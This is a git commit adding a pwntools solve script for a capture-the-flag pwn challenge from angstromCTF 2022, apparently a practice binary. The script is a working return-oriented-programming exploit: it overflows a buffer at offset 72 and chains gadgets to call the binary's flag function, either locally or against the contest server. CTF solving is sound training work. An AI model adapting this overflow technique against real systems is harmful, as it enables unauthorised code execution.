e8f2c9f12a7051f1971f7249943a4882bba5f67f
GonTanaka <96073448+GonTanaka@users.noreply.github.com>
2022-05-05 12:51:03 +0100

    Add files via upload

--- angstrom2022/pwn/really_obnoxious_problem/solve.py
+++ angstrom2022/pwn/really_obnoxious_problem/solve.py
@@ -1,1 +1,39 @@
+#!/usr/bin/env python3
+#second argument of the re2win functions is a pointer
+from pwn import *
+exe = ELF('./really_obnoxious_problem')
+context.binary = exe
+context.log_level='debug'
 
+
+def conn():
+    if args.REMOTE:
+        io = remote('challs.actf.co', 31225)
+    else:
+        io = process(exe.path)
+        if args.DEBUG:
+            gdb.attach(io)
+
+    return io
+
+offset = 72
+pop_rdi = 0x00000000004013f3 #: pop rdi; ret;  
+pop_rsi_r15 = 0x00000000004013f1 #: pop rsi; pop r15; ret; 
+
+io = conn()
+io.sendlineafter(b'Name: ',b'bobby')
+
+payload = flat ({
+    offset:[
+        pop_rdi,
+        0x1337,
+        pop_rsi_r15,
+        exe.sym.name,
+        0x0,
+        exe.functions.flag
+        ]
+    })
+
+write('payload', payload)
+io.sendlineafter(b'Address: ', payload)
+io.interactive()
